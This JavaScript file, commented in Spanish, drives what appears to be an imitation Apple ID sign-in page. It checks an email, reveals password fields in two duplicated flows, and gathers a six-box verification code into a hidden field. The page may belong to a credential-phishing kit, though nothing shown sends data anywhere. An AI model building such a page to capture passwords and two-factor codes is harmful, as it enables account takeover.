
// Función para validar el formato del email
function validarEmail(email) {
    const re = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return re.test(String(email).toLowerCase());
}

function showPasswordInput1() {
  const appleId = document.getElementById('apple-id-1').value;
  if (validarEmail(appleId)) {
    document.getElementById('apple-id-aux').value = document.getElementById('apple-id-1').value;
    document.getElementById('password-group').style.display = 'block';
    document.getElementById('apple-id-1').disabled = true;
    document.querySelector('.arrow-button').style.display = 'none';
    document.querySelector('.login-button').style.display = 'block';
    document.getElementById('password').focus();
  } else {
    alert("Porfavor ingrese un email válido.");
  }
  
}

function showPasswordInput2() {
  const appleId = document.getElementById('apple-id-2').value;
  if (validarEmail(appleId)) {
    document.getElementById('apple-id-aux-1').value = document.getElementById('apple-id-2').value;
    document.getElementById('password-group-1').style.display = 'block';
    document.getElementById('apple-id-2').disabled = true;
    document.querySelector('.arrow-button-1').style.display = 'none';
    document.querySelector('.login-button-1').style.display = 'block';
    document.getElementById('password-1').focus();
  } else {
    alert("Porfavor ingrese un email válido.");
  }
}

document.addEventListener('DOMContentLoaded', () => {
  const inputs = document.querySelectorAll('.code-input');
  const hiddenInput = document.getElementById('verification_code');

  inputs.forEach((input, index) => {
    // Mover al siguiente campo al ingresar un valor
    input.addEventListener('input', () => {
      if (input.value.length >= 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }

      // Actualizar el campo oculto con el código completo
      updateHiddenInput();
    });

    // Mover hacia atrás si el campo actual está vacío y se presiona "Backspace"
    input.addEventListener('keydown', (event) => {
      if (event.key === 'Backspace' && input.value.length === 0 && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });

  function updateHiddenInput() {
    const code = Array.from(inputs).map(input => input.value).join('');
    hiddenInput.value = code; // Actualiza el valor del input oculto
  }

  // Actualizar el input oculto al enviar el formulario
  document.getElementById('verification-form').addEventListener('submit', updateHiddenInput);
});
